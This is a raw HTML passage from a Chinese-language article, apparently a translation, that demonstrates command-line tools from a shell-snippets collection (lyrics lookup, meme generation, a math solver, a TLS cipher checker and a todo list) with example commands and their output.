!important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cryptocurrency</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83ddf233416509-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83ddf233416509-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cryptocurrency</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/daaad978cd5afc3692bdcf1d5716d174.png\" alt=\"\"></p>\n<h4 id=\"toc_16\">14、 Lyrics</h4>\n<p>这个脚本从命令行快速获取一首歌曲的歌词。</p>\n<p>例如，我将获取 “who is it” 歌曲的歌词，这是一首由 迈克尔·杰克逊Michael Jackson 演唱的流行歌曲。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83de2526835401\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ lyrics -a michael jackson -s who is it</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83de2526835401-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83de2526835401-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lyrics</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">michael </span><span class=\"crayon-v\">jackson</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">who </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">it</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/125e0389f4eb08d2e53e4aae4e747263.png\" alt=\"\"></p>\n<h4 id=\"toc_17\">15、 Meme</h4>\n<p>这个脚本允许你从命令行创建简单的表情贴图。它比基于 GUI 的表情包生成器快得多。</p>\n<p>要创建一个表情贴图，只需输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83de6190413515\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ meme -f mymeme\r\nEnter the name for the meme's background (Ex. buzz, doge, blb ): buzz\r\nEnter the text for the first line: THIS IS A\r\nEnter the text for the second line: MEME</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83de6190413515-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83de6190413515-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83de6190413515-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83de6190413515-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83de6190413515-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">meme</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mymeme</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83de6190413515-2\"><span class=\"crayon-e\">Enter </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">name </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-i\">meme</span>'<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">background</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Ex</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buzz</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">doge</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">blb</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">buzz</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83de6190413515-3\"><span class=\"crayon-e\">Enter </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">text </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">first </span><span class=\"crayon-v\">line</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">THIS</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IS</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83de6190413515-4\"><span class=\"crayon-e\">Enter </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">text </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">second </span><span class=\"crayon-v\">line</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MEME</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>这将在你当前的工作目录创建 jpg 文件。</p>\n<h4 id=\"toc_18\">16、 Newton</h4>\n<p>厌倦了解决复杂的数学问题？你来对了。Newton 脚本将执行数值计算，乃至于符号数学解析。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/ef9ba98934c2915c14d4fe83e8e4ba50.png\" alt=\"\"></p>\n<h4 id=\"toc_19\">17、 Siteciphers</h4>\n<p>这个脚本可以帮助你检查在给定的 https 站点上启用/禁用哪些加密算法。（LCTT 译注：指 HTTPS 通讯中采用的加密算法）</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83de9468550931\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ siteciphers google.com</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83de9468550931-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83de9468550931-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">siteciphers </span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/5468bd4494accc9bd8934d16ec0d1bd9.png\" alt=\"\"></p>\n<h4 id=\"toc_20\">18、 Todo</h4>\n<p>它允许你直接从终端创建日常任务。</p>\n<p>让我们来创建一些任务。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83dec573983164\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ todo -a The first task\r\n01). The first task Tue Jun 26 14:51:30 IST 2018</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83dec573983164-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83dec573983164-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83dec573983164-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">todo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">first </span><span class=\"crayon-i\">task</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83dec573983164-2\"><span class=\"crayon-cn\">01</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">first </span><span class=\"crayon-e\">task </span><span class=\"crayon-e\">Tue </span><span class=\"crayon-i\">Jun</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">51</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">IST</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>要添加其它任务，只需添加任务名称重新运行上述命令即可。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83def629908130\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ todo -a The second task\r\n01). The first task Tue Jun 26 14:51:30 IST 2018\r\n02). The second task Tue Jun 26 14:52:29 IST 2018</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83def629908130-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83def629908130-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83def629908130-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83def629908130-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">todo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">second </span><span class=\"crayon-i\">task</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83def629908130-2\"><span class=\"crayon-cn\">01</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">first </span><span class=\"crayon-e\">task </span><span class=\"crayon-e\">Tue </span><span class=\"crayon-i\">Jun</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">51</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">IST</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83def629908130-3\"><span class=\"crayon-cn\">02</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">second </span><span class=\"crayon-e\">task </span><span class=\"crayon-e\">Tue </span><span class=\"crayon-i\">Jun</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">52</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">IST</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>要查看任务列表，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83df3293357581\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ todo -g\r\n01). The first task Tue Jun 26 14:51:30 IST 2018\r\n02). A The second task Tue Jun 26 14:51:46 IST 2018</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83df3293357581-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83df3293357581-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83df3293357581-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83df3293357581-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">todo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">g</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83df3293357581-2\"><span class=\"crayon-cn\">01</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">first </span><span class=\"crayon-e\">task </span><span class=\"crayon-e\">Tue </span><span class=\"crayon-i\">Jun</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">51</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">IST</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83df3293357581-3\"><span class=\"crayon-cn\">02</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">second </span><span class=\"crayon-e\">task </span><span class=\"crayon-e\">Tue </span><span class=\"crayon-i\">Jun</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">51</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">46</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">IST</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>一旦你完成了任务，就可以将其从列表中删除，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83df6470852889\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div 